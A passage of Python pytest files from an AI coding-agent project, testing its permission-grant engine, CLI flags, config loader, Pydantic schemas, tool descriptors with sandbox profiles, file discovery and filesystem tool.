        engine.add_grant(grant)
        result = engine.check("run_shell_command", ["shell.exec"])
        assert result.allowed is False

    def test_wildcard_grant(self):
        """Grant with empty tool_name matches any tool."""
        engine = CapabilityEngine()
        grant = PermissionGrant(tool_name="", scope="shell.exec")
        engine.add_grant(grant)
        result = engine.check("run_shell_command", ["shell.exec"])
        assert result.allowed is True
        result2 = engine.check("other_tool", ["shell.exec"])
        assert result2.allowed is True

    def test_grant_plus_policy_mixed(self):
        policy = PolicyPack(allowed_scopes=["python.exec"])
        engine = CapabilityEngine(policy)
        grant = PermissionGrant(tool_name="install_project", scope="pip.install")
        engine.add_grant(grant)
        result = engine.check("install_project", ["python.exec", "pip.install"])
        assert result.allowed is True

    def test_list_active_grants(self):
        engine = CapabilityEngine()
        g1 = PermissionGrant(tool_name="a", scope="s1")
        g2 = PermissionGrant(tool_name="b", scope="s2")
        engine.add_grant(g1)
        engine.add_grant(g2)
        active = engine.list_active_grants()
        assert len(active) == 2

    def test_is_scope_granted_true(self):
        policy = PolicyPack(allowed_scopes=["shell.exec"])
        engine = CapabilityEngine(policy)
        assert engine.is_scope_granted("any", "shell.exec") is True

    def test_is_scope_granted_false(self):
        engine = CapabilityEngine()
        assert engine.is_scope_granted("any", "shell.exec") is False

    def test_is_scope_granted_via_grant(self):
        engine = CapabilityEngine()
        engine.add_grant(PermissionGrant(tool_name="t", scope="s"))
        assert engine.is_scope_granted("t", "s") is True


class TestInvocationScopedGrants:
    def test_invocation_grant_consumed_on_use(self):
        engine = CapabilityEngine()
        grant = PermissionGrant(
            tool_name="run_shell_command", scope="shell.exec",
            grant_scope="invocation",
        )
        engine.add_grant(grant)

        # First check succeeds and consumes the grant
        result = engine.check("run_shell_command", ["shell.exec"])
        assert result.allowed is True

        # Second check fails — grant consumed
        result = engine.check("run_shell_command", ["shell.exec"])
        assert result.allowed is False

    def test_session_grant_persists(self):
        engine = CapabilityEngine()
        grant = PermissionGrant(
            tool_name="run_shell_command", scope="shell.exec",
            grant_scope="session",
        )
        engine.add_grant(grant)

        result1 = engine.check("run_shell_command", ["shell.exec"])
        assert result1.allowed is True
        result2 = engine.check("run_shell_command", ["shell.exec"])
        assert result2.allowed is True


class TestTimeScopedGrants:
    def test_expired_grant_denied(self):
        engine = CapabilityEngine()
        # Grant issued 10 seconds ago, valid for 1 second
        grant = PermissionGrant(
            tool_name="t", scope="s",
            grant_issued_at=datetime.now(timezone.utc) - timedelta(seconds=10),
            grant_duration_seconds=1.0,
        )
        engine.add_grant(grant)
        result = engine.check("t", ["s"])
        assert result.allowed is False

    def test_non_expired_grant_allowed(self):
        engine = CapabilityEngine()
        grant = PermissionGrant(
            tool_name="t", scope="s",
            grant_issued_at=datetime.now(timezone.utc),
            grant_duration_seconds=3600.0,
        )
        engine.add_grant(grant)
        result = engine.check("t", ["s"])
        assert result.allowed is True

    def test_expire_stale_grants(self):
        engine = CapabilityEngine()
        stale = PermissionGrant(
            tool_name="t", scope="s",
            grant_issued_at=datetime.now(timezone.utc) - timedelta(seconds=10),
            grant_duration_seconds=1.0,
        )
        fresh = PermissionGrant(
            tool_name="t2", scope="s2",
            grant_issued_at=datetime.now(timezone.utc),
            grant_duration_seconds=3600.0,
        )
        engine.add_grant(stale)
        engine.add_grant(fresh)
        count = engine.expire_stale_grants()
        assert count == 1
        assert len(engine.list_active_grants()) == 1

    def test_no_duration_never_expires(self):
        engine = CapabilityEngine()
        grant = PermissionGrant(
            tool_name="t", scope="s",
            grant_duration_seconds=None,
        )
        engine.add_grant(grant)
        count = engine.expire_stale_grants()
        assert count == 0
        assert len(engine.list_active_grants()) == 1


class TestLoadGrants:
    def test_load_grants_replaces(self):
        engine = CapabilityEngine()
        engine.add_grant(PermissionGrant(tool_name="a", scope="x"))
        assert len(engine.list_active_grants()) == 1

        new_grants = [
            PermissionGrant(tool_name="b", scope="y"),
            PermissionGrant(tool_name="c", scope="z"),
        ]
        engine.load_grants(new_grants)
        assert len(engine.list_active_grants()) == 2

    def test_load_grants_for_replay(self):
        """Loaded grants should be usable for capability checks."""
        engine = CapabilityEngine()
        grants = [PermissionGrant(tool_name="t", scope="s")]
        engine.load_grants(grants)
        result = engine.check("t", ["s"])
        assert result.allowed is True

    def test_load_empty_clears(self):
        engine = CapabilityEngine()
        engine.add_grant(PermissionGrant(tool_name="a", scope="x"))
        engine.load_grants([])
        assert len(engine.list_active_grants()) == 0

```

## `tests/test_cli_smoke.py`

```python
# tests/test_cli_smoke.py — CLI integration smoke tests

import pytest
from unittest.mock import patch, MagicMock
from io import StringIO


class TestCLISmoke:
    """Test CLI arg paths by mocking at the Elf boundary."""

    def _make_mock_elf_class(self):
        """Create a mock Elf class that can be instantiated by _main()."""
        mock_elf = MagicMock()
        mock_elf.model = "test-model"
        mock_elf.text_color = "cyan"
        mock_elf.client.provider = "openai"
        mock_elf.history = [{"role": "system", "content": "test"}]
        mock_elf.chat.return_value = "test response"
        mock_elf.tools = MagicMock()
        mock_elf.memory = MagicMock()

        MockClass = MagicMock(return_value=mock_elf)
        MockClass.__name__ = "TestElf"
        return MockClass, mock_elf

    @patch("sys.argv", ["test", "hello world"])
    def test_basic_chat(self):
        from core.cli import _main
        MockClass, mock_elf = self._make_mock_elf_class()
        mock_elf.chat.return_value = iter([])  # stream mode returns iterator
        _main(MockClass)
        MockClass.assert_called_once()
        mock_elf.enrich_with_memory.assert_called_once_with("hello world")

    @patch("sys.argv", ["test", "hello", "--empty"])
    def test_empty_flag(self):
        from core.cli import _main
        MockClass, mock_elf = self._make_mock_elf_class()
        mock_elf.chat.return_value = iter([])
        _main(MockClass)
        mock_elf.reset_history.assert_called_once()

    @patch("sys.argv", ["test", "hello", "--purge"])
    def test_purge_flag(self):
        from core.cli import _main
        MockClass, mock_elf = self._make_mock_elf_class()
        mock_elf.chat.return_value = iter([])
        _main(MockClass)
        mock_elf.purge_memory.assert_called_once()

    @patch("sys.argv", ["test", "list files", "--shell"])
    def test_shell_flag(self):
        from core.cli import _main
        MockClass, mock_elf = self._make_mock_elf_class()
        mock_elf.run_shell_task.return_value = ("ls", "output", True, None)
        _main(MockClass)
        mock_elf.run_shell_task.assert_called_once()

    @patch("sys.argv", ["test", "print hello", "--python"])
    def test_python_flag(self):
        from core.cli import _main
        MockClass, mock_elf = self._make_mock_elf_class()
        mock_elf.run_python_task.return_value = ("code", "output", True, None)
        _main(MockClass)
        mock_elf.run_python_task.assert_called_once()

    @patch("sys.argv", ["test", "hello", "--md"])
    def test_md_flag(self):
        from core.cli import _main
        MockClass, mock_elf = self._make_mock_elf_class()
        mock_elf.chat.return_value = "markdown response"
        _main(MockClass)
        mock_elf.chat.assert_called_once_with("hello", stream=False)

    @patch("sys.argv", ["test", "hello", "--search"])
    def test_search_flag(self):
        from core.cli import _main
        MockClass, mock_elf = self._make_mock_elf_class()
        mock_elf.chat.return_value = iter([])
        _main(MockClass)
        mock_elf.enrich_with_search.assert_called_once()

```

## `tests/test_config_loader.py`

```python
# tests/test_config_loader.py — Config loader tests

import pytest
from core.tools.config_loader import load_project_config


class TestConfigLoader:
    def test_returns_empty_when_no_config(self, tmp_path):
        result = load_project_config(tmp_path)
        assert result == {}

    def test_loads_yml_file(self, tmp_path):
        config_file = tmp_path / ".judais-lobi.yml"
        config_file.write_text("verification:\n  lint: custom_lint\n")
        result = load_project_config(tmp_path)
        assert result["verification"]["lint"] == "custom_lint"

    def test_loads_yaml_extension(self, tmp_path):
        config_file = tmp_path / ".judais-lobi.yaml"
        config_file.write_text("verification:\n  test: custom_test\n")
        result = load_project_config(tmp_path)
        assert result["verification"]["test"] == "custom_test"

    def test_yml_takes_precedence(self, tmp_path):
        (tmp_path / ".judais-lobi.yml").write_text("source: yml\n")
        (tmp_path / ".judais-lobi.yaml").write_text("source: yaml\n")
        result = load_project_config(tmp_path)
        assert result["source"] == "yml"

    def test_empty_file_returns_empty(self, tmp_path):
        (tmp_path / ".judais-lobi.yml").write_text("")
        result = load_project_config(tmp_path)
        assert result == {}

    def test_invalid_yaml_returns_empty(self, tmp_path):
        (tmp_path / ".judais-lobi.yml").write_text(": : :\n  bad yaml {{[")
        result = load_project_config(tmp_path)
        assert result == {}

```

## `tests/test_contracts.py`

```python
# tests/test_contracts.py — Tests for Pydantic contract models

import pytest
from datetime import datetime
from pydantic import ValidationError

from core.contracts.schemas import (
    PersonalityConfig,
    TaskContract,
    PlanStep,
    ChangePlan,
    RetrievedChunk,
    MemoryPin,
    ContextPack,
    FilePatch,
    PatchSet,
    RunReport,
    PermissionRequest,
    PermissionGrant,
    PolicyPack,
    FinalReport,
    PHASE_SCHEMAS,
)


# ---------------------------------------------------------------------------
# PersonalityConfig
# ---------------------------------------------------------------------------

class TestPersonalityConfig:
    def test_minimal_construction(self):
        pc = PersonalityConfig(
            name="test", system_message="You are test.",
            examples=[("Q?", "A.")],
        )
        assert pc.name == "test"
        assert pc.text_color == "cyan"  # default
        assert pc.env_path == "~/.elf_env"  # default

    def test_full_construction(self):
        pc = PersonalityConfig(
            name="lobi", system_message="You are Lobi.",
            examples=[("Q?", "A."), ("Q2?", "A2.")],
            text_color="green", env_path="~/.lobi_env",
            rag_enhancement_style="playful",
            default_model="gpt-5-mini", default_provider="openai",
        )
        assert pc.default_model == "gpt-5-mini"
        assert pc.default_provider == "openai"
        assert len(pc.examples) == 2

    def test_frozen_immutability(self):
        pc = PersonalityConfig(
            name="test", system_message="msg", examples=[],
        )
        with pytest.raises(ValidationError):
            pc.name = "changed"

    def test_model_copy(self):
        pc = PersonalityConfig(
            name="test", system_message="msg", examples=[("Q", "A")],
        )
        copy = pc.model_copy()
        assert copy == pc
        assert copy is not pc

    def test_missing_required_field(self):
        with pytest.raises(ValidationError):
            PersonalityConfig(name="test")  # missing system_message, examples

    def test_serialization_roundtrip(self):
        pc = PersonalityConfig(
            name="test", system_message="msg", examples=[("Q", "A")],
        )
        data = pc.model_dump()
        restored = PersonalityConfig(**data)
        assert restored == pc


# ---------------------------------------------------------------------------
# TaskContract
# ---------------------------------------------------------------------------

class TestTaskContract:
    def test_construction_with_defaults(self):
        tc = TaskContract(task_id="t1", description="Add pagination")
        assert tc.task_id == "t1"
        assert tc.constraints == []
        assert tc.acceptance_criteria == []
        assert tc.allowed_tools == []
        assert isinstance(tc.created_at, datetime)

    def test_full_construction(self):
        tc = TaskContract(
            task_id="t2", description="Fix bug",
            constraints=["no side effects"],
            acceptance_criteria=["tests pass"],
            allowed_tools=["run_shell_command"],
        )
        assert len(tc.constraints) == 1
        assert "tests pass" in tc.acceptance_criteria

    def test_missing_required(self):
        with pytest.raises(ValidationError):
            TaskContract(task_id="t1")  # missing description


# ---------------------------------------------------------------------------
# PlanStep & ChangePlan
# ---------------------------------------------------------------------------

class TestChangePlan:
    def test_plan_step(self):
        step = PlanStep(description="Create file", action="create", target_file="foo.py")
        assert step.action == "create"

    def test_change_plan(self):
        steps = [PlanStep(description="Create file", action="create")]
        plan = ChangePlan(task_id="t1", steps=steps, rationale="needed")
        assert len(plan.steps) == 1
        assert plan.rationale == "needed"

    def test_empty_steps_allowed(self):
        plan = ChangePlan(task_id="t1", steps=[])
        assert plan.steps == []


# ---------------------------------------------------------------------------
# Memory & Retrieval
# ---------------------------------------------------------------------------

class TestRetrievedChunk:
    def test_construction(self):
        chunk = RetrievedChunk(source="memory.db", content="The sky is blue")
        assert chunk.relevance_score == 0.0

    def test_with_score(self):
        chunk = RetrievedChunk(source="rag", content="data", relevance_score=0.95)
        assert chunk.relevance_score == 0.95


class TestMemoryPin:
    def test_construction(self):
        pin = MemoryPin(
            embedding_backend="openai", model_name="text-embedding-3-large",
            query="what color", chunk_ids=[1, 2], similarity_scores=[0.9, 0.8],
        )
        assert len(pin.chunk_ids) == 2
        assert isinstance(pin.timestamp, datetime)


class TestContextPack:
    def test_empty(self):
        cp = ContextPack(task_id="t1")
        assert cp.retrieved_chunks == []
        assert cp.memory_pins == []

    def test_with_chunks(self):
        chunks = [RetrievedChunk(source="rag", content="data")]
        cp = ContextPack(task_id="t1", retrieved_chunks=chunks)
        assert len(cp.retrieved_chunks) == 1


# ---------------------------------------------------------------------------
# Patch contracts
# ---------------------------------------------------------------------------

class TestPatchContracts:
    def test_file_patch_defaults(self):
        fp = FilePatch(file_path="foo.py")
        assert fp.action == "modify"
        assert fp.search_block == ""

    def test_patch_set(self):
        patches = [FilePatch(file_path="a.py", search_block="old", replace_block="new")]
        ps = PatchSet(task_id="t1", patches=patches)
        assert len(ps.patches) == 1


# ---------------------------------------------------------------------------
# RunReport
# ---------------------------------------------------------------------------

class TestRunReport:
    def test_defaults(self):
        rr = RunReport()
        assert rr.exit_code == 0
        assert rr.passed is False

    def test_successful_run(self):
        rr = RunReport(exit_code=0, passed=True, stdout="ok", duration_seconds=1.5)
        assert rr.passed is True


# ---------------------------------------------------------------------------
# Permissions
# ---------------------------------------------------------------------------

class TestPermissions:
    def test_permission_request(self):
        pr = PermissionRequest(tool_name="run_shell_command", scope="*", reason="needed")
        assert isinstance(pr.requested_at, datetime)

    def test_permission_grant(self):
        pg = PermissionGrant(tool_name="run_shell_command", scope="*")
        assert pg.granted_by == "user"
        assert pg.grant_scope == "session"
        assert pg.grant_duration_seconds is None

    def test_permission_grant_with_duration(self):
        pg = PermissionGrant(
            tool_name="run_shell_command", scope="*",
            grant_duration_seconds=3600.0, grant_scope="task",
        )
        assert pg.grant_duration_seconds == 3600.0


# ---------------------------------------------------------------------------
# PolicyPack
# ---------------------------------------------------------------------------

class TestPolicyPack:
    def test_defaults(self):
        pp = PolicyPack()
        assert pp.sandbox_backend == "bwrap"
        assert pp.allowed_tools == []

    def test_full(self):
        pp = PolicyPack(
            allowed_tools=["run_shell_command"],
            sandbox_backend="docker",
            budget_overrides={"max_phase_retries": 5},
        )
        assert pp.sandbox_backend == "docker"


# ---------------------------------------------------------------------------
# FinalReport
# ---------------------------------------------------------------------------

class TestFinalReport:
    def test_completed(self):
        fr = FinalReport(
            task_description="add pagination", outcome="completed",
            total_iterations=10, duration_seconds=45.0,
        )
        assert fr.outcome == "completed"
        assert fr.halt_reason is None

    def test_halted(self):
        fr = FinalReport(
            task_description="fix bug", outcome="halted",
            halt_reason="budget exhausted",
        )
        assert fr.halt_reason == "budget exhausted"


# ---------------------------------------------------------------------------
# PHASE_SCHEMAS mapping
# ---------------------------------------------------------------------------

class TestPhaseSchemas:
    def test_contains_expected_phases(self):
        expected = {"INTAKE", "CONTRACT", "REPO_MAP", "PLAN", "RETRIEVE", "PATCH", "RUN", "FINALIZE"}
        assert set(PHASE_SCHEMAS.keys()) == expected

    def test_intake_maps_to_task_contract(self):
        assert PHASE_SCHEMAS["INTAKE"] is TaskContract

    def test_plan_maps_to_change_plan(self):
        assert PHASE_SCHEMAS["PLAN"] is ChangePlan

    def test_run_maps_to_run_report(self):
        assert PHASE_SCHEMAS["RUN"] is RunReport

    def test_finalize_maps_to_final_report(self):
        assert PHASE_SCHEMAS["FINALIZE"] is FinalReport

    def test_all_values_are_pydantic_models(self):
        from pydantic import BaseModel
        for phase, schema in PHASE_SCHEMAS.items():
            assert issubclass(schema, BaseModel), f"{phase} does not map to a BaseModel"

```

## `tests/test_descriptors.py`

```python
# tests/test_descriptors.py

import pytest

from core.tools.descriptors import (
    SandboxProfile,
    ToolDescriptor,
    SHELL_DESCRIPTOR,
    PYTHON_DESCRIPTOR,
    INSTALL_DESCRIPTOR,
    WEB_SEARCH_DESCRIPTOR,
    FETCH_PAGE_DESCRIPTOR,
    RAG_CRAWLER_DESCRIPTOR,
    VOICE_DESCRIPTOR,
    ALL_DESCRIPTORS,
)


class TestSandboxProfile:
    def test_default_values(self):
        p = SandboxProfile()
        assert p.workspace_writable is True
        assert p.allowed_read_paths == []
        assert p.allowed_write_paths == []
        assert p.max_cpu_seconds is None
        assert p.max_memory_bytes is None
        assert p.max_processes is None

    def test_custom_values(self):
        p = SandboxProfile(
            workspace_writable=False,
            allowed_read_paths=["/etc"],
            allowed_write_paths=["/tmp"],
            max_cpu_seconds=60,
            max_memory_bytes=1_073_741_824,
            max_processes=10,
        )
        assert p.workspace_writable is False
        assert p.allowed_read_paths == ["/etc"]
        assert p.max_cpu_seconds == 60
        assert p.max_memory_bytes == 1_073_741_824
        assert p.max_processes == 10

    def test_frozen(self):
        p = SandboxProfile()
        with pytest.raises(AttributeError):
            p.workspace_writable = False


class TestToolDescriptor:
    def test_default_values(self):
        d = ToolDescriptor(tool_name="test_tool")
        assert d.tool_name == "test_tool"
        assert d.required_scopes == []
        assert d.requires_network is False
        assert d.network_scopes == []
        assert isinstance(d.sandbox_profile, SandboxProfile)
        assert d.description == ""

    def test_custom_values(self):
        profile = SandboxProfile(max_cpu_seconds=30)
        d = ToolDescriptor(
            tool_name="custom",
            required_scopes=["a.b", "c.d"],
            requires_network=True,
            network_scopes=["net.any"],
            sandbox_profile=profile,
            description="A custom tool",
        )
        assert d.required_scopes == ["a.b", "c.d"]
        assert d.requires_network is True
        assert d.network_scopes == ["net.any"]
        assert d.sandbox_profile.max_cpu_seconds == 30
        assert d.description == "A custom tool"

    def test_frozen(self):
        d = ToolDescriptor(tool_name="test")
        with pytest.raises(AttributeError):
            d.tool_name = "changed"


class TestPrebuiltDescriptors:
    def test_shell_descriptor(self):
        assert SHELL_DESCRIPTOR.tool_name == "run_shell_command"
        assert "shell.exec" in SHELL_DESCRIPTOR.required_scopes
        assert SHELL_DESCRIPTOR.requires_network is False

    def test_python_descriptor(self):
        assert PYTHON_DESCRIPTOR.tool_name == "run_python_code"
        assert "python.exec" in PYTHON_DESCRIPTOR.required_scopes

    def test_install_descriptor(self):
        assert INSTALL_DESCRIPTOR.tool_name == "install_project"
        assert "python.exec" in INSTALL_DESCRIPTOR.required_scopes
        assert "pip.install" in INSTALL_DESCRIPTOR.required_scopes

    def test_web_search_descriptor(self):
        assert WEB_SEARCH_DESCRIPTOR.tool_name == "perform_web_search"
        assert WEB_SEARCH_DESCRIPTOR.requires_network is True
        assert "http.read" in WEB_SEARCH_DESCRIPTOR.network_scopes

    def test_fetch_page_descriptor(self):
        assert FETCH_PAGE_DESCRIPTOR.tool_name == "fetch_page_content"
        assert FETCH_PAGE_DESCRIPTOR.requires_network is True

    def test_rag_crawler_descriptor(self):
        assert RAG_CRAWLER_DESCRIPTOR.tool_name == "rag_crawl"
        assert "fs.read" in RAG_CRAWLER_DESCRIPTOR.required_scopes

    def test_voice_descriptor(self):
        assert VOICE_DESCRIPTOR.tool_name == "speak_text"
        assert "audio.output" in VOICE_DESCRIPTOR.required_scopes

    def test_all_descriptors_list(self):
        assert len(ALL_DESCRIPTORS) == 10
        names = [d.tool_name for d in ALL_DESCRIPTORS]
        assert "run_shell_command" in names
        assert "speak_text" in names
        assert "fs" in names
        assert "git" in names
        assert "verify" in names

    def test_all_descriptors_have_descriptions(self):
        for d in ALL_DESCRIPTORS:
            assert d.description, f"{d.tool_name} has no description"

```

## `tests/test_descriptors_expanded.py`

```python
# tests/test_descriptors_expanded.py — Phase 4a consolidated descriptor tests

import pytest

from core.tools.descriptors import (
    ToolDescriptor,
    FS_DESCRIPTOR,
    GIT_DESCRIPTOR,
    VERIFY_DESCRIPTOR,
    HIGH_RISK_ACTIONS,
    SKIP_SANDBOX_ACTIONS,
    NETWORK_ACTIONS,
    ALL_DESCRIPTORS,
)


class TestToolDescriptorNewFields:
    def test_high_risk_default_false(self):
        d = ToolDescriptor(tool_name="t")
        assert d.high_risk is False

    def test_skip_sandbox_default_false(self):
        d = ToolDescriptor(tool_name="t")
        assert d.skip_sandbox is False

    def test_action_scopes_default_empty(self):
        d = ToolDescriptor(tool_name="t")
        assert d.action_scopes == {}

    def test_action_scopes_custom(self):
        d = ToolDescriptor(
            tool_name="multi",
            action_scopes={"read": ["a.read"], "write": ["a.write"]},
        )
        assert d.action_scopes["read"] == ["a.read"]
        assert d.action_scopes["write"] == ["a.write"]

    def test_frozen_action_scopes(self):
        d = ToolDescriptor(tool_name="t", action_scopes={"a": ["x"]})
        with pytest.raises(AttributeError):
            d.action_scopes = {}


class TestFsDescriptor:
    def test_tool_name(self):
        assert FS_DESCRIPTOR.tool_name == "fs"

    def test_required_scopes_union(self):
        assert "fs.read" in FS_DESCRIPTOR.required_scopes
        assert "fs.write" in FS_DESCRIPTOR.required_scopes
        assert "fs.delete" in FS_DESCRIPTOR.required_scopes

    def test_action_scopes_read(self):
        assert FS_DESCRIPTOR.action_scopes["read"] == ["fs.read"]
        assert FS_DESCRIPTOR.action_scopes["list"] == ["fs.read"]
        assert FS_DESCRIPTOR.action_scopes["stat"] == ["fs.read"]

    def test_action_scopes_write(self):
        assert FS_DESCRIPTOR.action_scopes["write"] == ["fs.write"]

    def test_action_scopes_delete(self):
        assert FS_DESCRIPTOR.action_scopes["delete"] == ["fs.delete"]

    def test_all_actions_present(self):
        expected = {"read", "write", "delete", "list", "stat"}
        assert set(FS_DESCRIPTOR.action_scopes.keys()) == expected


class TestGitDescriptor:
    def test_tool_name(self):
        assert GIT_DESCRIPTOR.tool_name == "git"

    def test_required_scopes_union(self):
        scopes = set(GIT_DESCRIPTOR.required_scopes)
        assert {"git.read", "git.write", "git.push", "git.fetch"} == scopes

    def test_read_actions(self):
        for action in ("status", "diff", "log"):
            assert GIT_DESCRIPTOR.action_scopes[action] == ["git.read"]

    def test_write_actions(self):
        for action in ("add", "commit", "branch", "stash", "tag", "reset"):
            assert GIT_DESCRIPTOR.action_scopes[action] == ["git.write"]

    def test_push_action(self):
        assert GIT_DESCRIPTOR.action_scopes["push"] == ["git.push"]

    def test_fetch_actions(self):
        for action in ("pull", "fetch"):
            assert GIT_DESCRIPTOR.action_scopes[action] == ["git.fetch"]

    def test_all_twelve_actions(self):
        expected = {
            "status", "diff", "log", "add", "commit", "branch",
            "push", "pull", "fetch", "stash", "tag", "reset",
        }
        assert set(GIT_DESCRIPTOR.action_scopes.keys()) == expected


class TestVerifyDescriptor:
    def test_tool_name(self):
        assert VERIFY_DESCRIPTOR.tool_name == "verify"

    def test_single_scope(self):
        assert VERIFY_DESCRIPTOR.required_scopes == ["verify.run"]

    def test_all_actions_use_same_scope(self):
        for action in ("lint", "test", "typecheck", "format"):
            assert VERIFY_DESCRIPTOR.action_scopes[action] == ["verify.run"]


class TestActionMetadataSets:
    def test_high_risk_git_push(self):
        assert ("git", "push") in HIGH_RISK_ACTIONS

    def test_high_risk_git_reset(self):
        assert ("git", "reset") in HIGH_RISK_ACTIONS

    def test_high_risk_fs_delete(self):
        assert ("fs", "delete") in HIGH_RISK_ACTIONS

    def test_skip_sandbox_network_tools(self):
        for action in ("push", "pull", "fetch"):
            assert ("git", action) in SKIP_SANDBOX_ACTIONS
            assert ("git", action) in NETWORK_ACTIONS

    def test_safe_actions_not_high_risk(self):
        assert ("git", "status") not in HIGH_RISK_ACTIONS
        assert ("git", "log") not in HIGH_RISK_ACTIONS
        assert ("fs", "read") not in HIGH_RISK_ACTIONS

    def test_all_descriptors_includes_consolidated(self):
        names = [d.tool_name for d in ALL_DESCRIPTORS]
        assert "fs" in names
        assert "git" in names
        assert "verify" in names
        assert len(ALL_DESCRIPTORS) == 10

```

## `tests/test_file_discovery.py`

```python
# tests/test_file_discovery.py — Tests for file discovery and language classification

import pytest
from pathlib import Path

from core.context.file_discovery import (
    classify_language,
    discover_files_git,
    discover_files_walk,
    discover_files,
    LANGUAGE_MAP,
    BINARY_EXTENSIONS,
    DEFAULT_IGNORE_PATTERNS,
)


# ---------------------------------------------------------------------------
# classify_language
# ---------------------------------------------------------------------------

class TestClassifyLanguage:
    def test_python(self):
        assert classify_language("src/main.py") == "python"

    def test_python_stub(self):
        assert classify_language("types/foo.pyi") == "python"

    def test_javascript(self):
        assert classify_language("app/index.js") == "javascript"

    def test_typescript(self):
        assert classify_language("app/index.ts") == "typescript"

    def test_tsx(self):
        assert classify_language("components/App.tsx") == "typescript"

    def test_c(self):
        assert classify_language("src/main.c") == "c"

    def test_c_header(self):
        assert classify_language("include/header.h") == "c"

    def test_cpp(self):
        assert classify_language("src/engine.cpp") == "cpp"

    def test_rust(self):
        assert classify_language("src/lib.rs") == "rust"

    def test_go(self):
        assert classify_language("cmd/main.go") == "go"

    def test_java(self):
        assert classify_language("src/Main.java") == "java"

    def test_makefile(self):
        assert classify_language("Makefile") == "makefile"

    def test_dockerfile(self):
        assert classify_language("Dockerfile") == "dockerfile"

    def test_unknown_extension(self):
        assert classify_language("data/unknown.xyz") == ""

    def test_no_extension(self):
        assert classify_language("README") == ""


# ---------------------------------------------------------------------------
# discover_files_git
# ---------------------------------------------------------------------------

class TestDiscoverFilesGit:
    def test_basic_listing(self):
        def runner(cmd, *, shell=False, timeout=None, executable=None):
            return 0, "src/main.py\nlib/util.py\nREADME.md\n", ""
        files = discover_files_git("/fake/repo", subprocess_runner=runner)
        assert files == ["README.md", "lib/util.py", "src/main.py"]

    def test_filters_binaries(self):
        def runner(cmd, *, shell=False, timeout=None, executable=None):
            return 0, "src/main.py\nassets/logo.png\nlib/helper.so\n", ""
        files = discover_files_git("/fake/repo", subprocess_runner=runner)
        assert files == ["src/main.py"]

    def test_empty_repo(self):
        def runner(cmd, *, shell=False, timeout=None, executable=None):
            return 0, "", ""
        files = discover_files_git("/fake/repo", subprocess_runner=runner)
        assert files == []

    def test_failure_raises_runtime_error(self):
        def runner(cmd, *, shell=False, timeout=None, executable=None):
            return 128, "", "fatal: not a git repository"
        with pytest.raises(RuntimeError, match="git ls-files failed"):
            discover_files_git("/fake/repo", subprocess_runner=runner)

    def test_blank_lines_filtered(self):
        def runner(cmd, *, shell=False, timeout=None, executable=None):
            return 0, "a.py\n\n\nb.py\n", ""
        files = discover_files_git("/fake/repo", subprocess_runner=runner)
        assert files == ["a.py", "b.py"]


# ---------------------------------------------------------------------------
# discover_files_walk
# ---------------------------------------------------------------------------

class TestDiscoverFilesWalk:
    def test_basic_walk(self, tmp_path):
        (tmp_path / "a.py").write_text("pass")
        (tmp_path / "b.js").write_text("//")
        sub = tmp_path / "sub"
        sub.mkdir()
        (sub / "c.rs").write_text("fn main(){}")
        files = discover_files_walk(str(tmp_path))
        assert "a.py" in files
        assert "b.js" in files
        assert str(Path("sub/c.rs")) in files

    def test_ignores_pycache(self, tmp_path):
        cache = tmp_path / "__pycache__"
        cache.mkdir()
        (cache / "module.cpython-312.pyc").write_text("")
        (tmp_path / "main.py").write_text("pass")
        files = discover_files_walk(str(tmp_path))
        assert files == ["main.py"]

    def test_ignores_node_modules(self, tmp_path):
        nm = tmp_path / "node_modules"
        nm.mkdir()
        (nm / "dep.js").write_text("//")
        (tmp_path / "app.js").write_text("//")
        files = discover_files_walk(str(tmp_path))
        assert files == ["app.js"]

    def test_filters_binary_extensions(self, tmp_path):
        (tmp_path / "code.py").write_text("pass")
        (tmp_path / "image.png").write_bytes(b"\x89PNG")
        files = discover_files_walk(str(tmp_path))
        assert files == ["code.py"]

    def test_empty_directory(self, tmp_path):
        files = discover_files_walk(str(tmp_path))
        assert files == []

    def test_ignores_egg_info(self, tmp_path):
        egg = tmp_path / "pkg.egg-info"
        egg.mkdir()
        (egg / "PKG-INFO").write_text("")
        (tmp_path / "setup.py").write_text("pass")
        files = discover_files_walk(str(tmp_path))
        assert files == ["setup.py"]


# ---------------------------------------------------------------------------
# discover_files (unified)
# ---------------------------------------------------------------------------

class TestDiscoverFiles:
    def test_prefers_git_when_available(self):
        def runner(cmd, *, shell=False, timeout=None, executable=None):
            return 0, "a.py\nb.py\n", ""
        files = discover_files("/fake/repo", subprocess_runner=runner)
        assert files == ["a.py", "b.py"]

    def test_falls_back_to_walk_on_git_failure(self, tmp_path):
        (tmp_path / "code.py").write_text("pass")
        def runner(cmd, *, shell=False, timeout=None, executable=None):
            return 128, "", "fatal: not a git repository"
        files = discover_files(str(tmp_path), subprocess_runner=runner)
        assert "code.py" in files


# ---------------------------------------------------------------------------
# Constants sanity checks
# ---------------------------------------------------------------------------

class TestConstants:
    def test_language_map_has_common_extensions(self):
        for ext in [".py", ".js", ".ts", ".c", ".cpp", ".rs", ".go", ".java"]:
            assert ext in LANGUAGE_MAP

    def test_binary_extensions_has_images(self):
        for ext in [".png", ".jpg", ".gif"]:
            assert ext in BINARY_EXTENSIONS

    def test_ignore_patterns_has_common_dirs(self):
        for d in ["__pycache__", ".git", "node_modules"]:
            assert d in DEFAULT_IGNORE_PATTERNS

```

## `tests/test_fs_tools.py`

```python
# tests/test_fs_tools.py — FsTool tests

import json
import pytest
from core.tools.fs_tools import FsTool


@pytest.fixture
def fs():
    return FsTool()


class TestFsRead:
    def test_read_existing_file(self, fs, tmp_path):
        f = tmp_path / "hello.txt"
        f.write_text("hello world")
        rc, out, err = fs("read", str(f))
        assert rc == 0
        assert out == "hello world"
        assert err == ""

    def test_read_nonexistent(self, fs, tmp_path):
        rc, out, err = fs("read", str(tmp_path / "nope.txt"))
        assert rc == 1
        assert "not found" in err.lower()

    def test_read_directory_fails(self, fs, tmp_path):
        rc, out, err = fs("read", str(tmp_path))
        assert rc == 1
        assert "not a file" in err.lower()


class TestFsWrite:
    def test_write_new_file(self, fs, tmp_path):
        target = tmp_path / "out.txt"
        rc, out, err = fs("write", str(target), content="data")
        assert rc == 0
        assert "4 bytes" in out
        assert target.read_text() == "data"

    def test_write_creates_parents(self, fs, tmp_path):
        target = tmp_path / "a" / "b" / "c.txt"
        rc, out, err = fs("write", str(target), content="nested")
        assert rc == 0
        assert target.read_text() == "nested"

    def test_write_overwrites(self, fs, tmp_path):
        target = tmp_path / "f.txt"
        target.write_text("old")
        fs("write", str(target), content="new")
        assert target.read_text() == "new"


class TestFsDelete:
    def test_delete_file(self, fs, tmp_path):
        f = tmp_path / "doomed.txt"
        f.write_text("bye")
